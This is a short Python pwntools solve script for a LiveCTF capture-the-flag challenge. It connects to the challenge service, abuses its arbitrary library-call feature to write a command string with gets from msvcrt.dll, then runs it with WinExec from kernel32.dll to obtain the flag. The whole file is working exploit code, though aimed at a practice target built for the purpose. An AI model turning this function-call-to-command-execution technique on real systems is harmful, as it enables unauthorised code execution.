#!/usr/bin/env python3

from pwn import *

# r = process("./challenge")
r = remote(os.environ.get('HOST', 'localhost'), 31337)

def call(fn, lib, arg, res=False):
    r.sendlineafter(b"load?", lib)
    r.sendlineafter(b"call?", fn)
    r.sendlineafter(b"argument?", str(arg).encode())
    r.recvuntil(b"Alright")
    if not res:
        return
    data = b""
    for s in r.recvuntil(b"Which", drop=True).split(b"\x1b")[1:-1]:
        data += s[5:]
    return int(data[data.find(b"Result:")+7:].strip(), 16)

#rw = call(b"malloc", 100, True)
rw = 5368791040
call(b"gets", b"system32/msvcrt.dll", rw)
r.sendline(b"./submitter")
call(b"WinExec", b"system32/kernel32.dll", rw)
r.recvuntil(b"Flag: ")
flag = r.recvline_contains(b'LiveCTF{').decode().strip()
log.info(flag)
r.interactive()
